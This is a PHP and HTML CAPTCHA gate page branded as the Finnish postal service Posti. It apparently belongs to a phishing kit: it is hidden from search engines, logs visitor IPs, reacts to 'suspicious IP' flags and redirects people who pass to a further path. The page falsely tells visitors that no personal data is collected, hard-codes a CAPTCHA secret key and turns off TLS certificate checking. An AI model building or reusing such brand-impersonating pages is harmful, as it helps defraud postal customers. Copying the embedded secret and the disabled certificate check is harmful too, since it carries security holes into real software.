<?php
/**
 * Page CAPTCHA hCaptcha
 * Affiche le CAPTCHA et vérifie la réponse
 */

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require __DIR__ . '/config.php';

// Config CAPTCHA
define('HCAPTCHA_SITE_KEY', 'f66ebfd6-5294-49da-a13c-63684b521698'); // À remplacer
define('HCAPTCHA_SECRET_KEY', 'ES_b2f3fb5406c646a78f18d60a7813a239'); // À remplacer

// Vérifier si CAPTCHA a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['h-captcha-response'])) {
    $token = $_POST['h-captcha-response'];
    
    // Vérifier le token CAPTCHA
    $ch = curl_init('https://hcaptcha.com/siteverify');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'secret' => HCAPTCHA_SECRET_KEY,
            'response' => $token
        ]),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ]);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    $captchaData = json_decode($response, true);

    // CAPTCHA réussi
    if (!empty($captchaData['success']) && $captchaData['success'] === true) {
        $_SESSION['captcha_passed'] = true;
        $_SESSION['captcha_passed_time'] = time();
        $_SESSION['captcha_verified_ip'] = $_SESSION['captcha_ip'] ?? '';

        @file_put_contents(__DIR__ . '/logs/captcha_passed.log',
            date('Y-m-d H:i:s') . " | " . ($_SESSION['captcha_ip'] ?? '') . 
            " | Score: " . ($captchaData['score'] ?? 'N/A') . "\n",
            FILE_APPEND
        );

        // Redirection
        $redirect = $_SESSION['captcha_redirect'] ?? '/c';
        header('Location: /' . ltrim($redirect, '/'));
        exit;
    } else {
        $captchaError = 'CAPTCHA échoué. Veuillez réessayer.';
    }
}
?>
<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>Vérification de sécurité - Posti</title>
    <link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            background: #fff;
            padding: 16px 24px;
            border-bottom: 1px solid #e5e5e5;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 900;
            font-style: italic;
            color: #FF6200;
        }
        
        .container {
            background: #fff;
            border-radius: 16px;
            padding: 48px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            margin-top: 60px;
            text-align: center;
        }
        
        .icon {
            width: 80px;
            height: 80px;
            background: #E3F2FD;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
        }
        
        .icon svg {
            width: 40px;
            height: 40px;
            fill: #1976D2;
        }
        
        h1 {
            font-size: 24px;
            color: #1F2937;
            margin-bottom: 12px;
        }
        
        p {
            color: #6B7280;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 24px;
        }
        
        .error-box {
            background: #FEE2E2;
            border: 1px solid #FCA5A5;
            border-radius: 8px;
            padding: 12px 16px;
            color: #DC2626;
            font-size: 14px;
            margin-bottom: 24px;
            display: none;
        }
        
        .error-box.show {
            display: block;
        }
        
        .captcha-container {
            background: #F9FAFB;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid #E5E7EB;
        }
        
        .h-captcha {
            display: flex;
            justify-content: center;
            transform: scale(1);
            transform-origin: center;
        }
        
        form {
            display: flex;
            flex-direction: column;
            gap: 0;
        }
        
        .btn-verify {
            background: #FF6200;
            color: #fff;
            border: none;
            border-radius: 30px;
            padding: 14px 32px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 12px;
        }
        
        .btn-verify:hover {
            background: #E55500;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 98, 0, 0.3);
        }
        
        .btn-verify:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .reason {
            color: #9CA3AF;
            font-size: 13px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #E5E7EB;
        }
        
        .info-box {
            background: #F0F9FF;
            border-left: 4px solid #0284C7;
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 13px;
            color: #0C4A6E;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 32px 20px;
                margin-top: 80px;
            }
            h1 {
                font-size: 20px;
            }
            p {
                font-size: 14px;
            }
            .h-captcha {
                transform: scale(0.9);
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <span class="logo">posti</span>
    </div>

    <div class="container">
        <div class="icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
        </div>

        <h1>Vérification de sécurité</h1>
        <p>Veuillez vérifier que vous êtes un utilisateur réel en complétant le CAPTCHA ci-dessous.</p>

        <div class="info-box">
            ✓ Vérification SSL-chiffrée<br>
            ✓ Aucune donnée personnelle collectée<br>
            ✓ Processus immédiat
        </div>

        <?php if (!empty($captchaError)): ?>
            <div class="error-box show">
                ❌ <?php echo htmlspecialchars($captchaError); ?>
            </div>
        <?php endif; ?>

        <form method="POST">
            <div class="captcha-container">
                <div class="h-captcha" data-sitekey="<?php echo HCAPTCHA_SITE_KEY; ?>"></div>
            </div>

            <button type="submit" class="btn-verify" id="btn-verify" disabled>
                Vérifier et continuer
            </button>
        </form>

        <div class="reason">
            <?php 
                $reason = $_SESSION['captcha_reason'] ?? '';
                if ($reason === 'api_error') {
                    echo '⚠️ Vérification API de sécurité requise';
                } elseif (strpos($reason, 'suspicious_ip') === 0) {
                    echo '⚠️ Accès depuis IP inhabituelle';
                } else {
                    echo '⚠️ Vérification de sécurité standard';
                }
            ?>
        </div>
    </div>

    <!-- Script hCaptcha -->
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    
    <script>
        // Activer le bouton seulement quand CAPTCHA est complété
        const observer = new MutationObserver(() => {
            const captchaResponse = document.querySelector('[name="h-captcha-response"]');
            const btnVerify = document.getElementById('btn-verify');
            
            if (captchaResponse && captchaResponse.value.length > 0) {
                btnVerify.disabled = false;
            } else {
                btnVerify.disabled = true;
            }
        });

        observer.observe(document.body, {
            subtree: true,
            attributes: true,
            childList: true
        });

        // Vérifier au chargement aussi
        document.addEventListener('load', () => {
            const captchaResponse = document.querySelector('[name="h-captcha-response"]');
            const btnVerify = document.getElementById('btn-verify');
            if (captchaResponse && captchaResponse.value.length > 0) {
                btnVerify.disabled = false;
            }
        });
    </script>
</body>
</html>
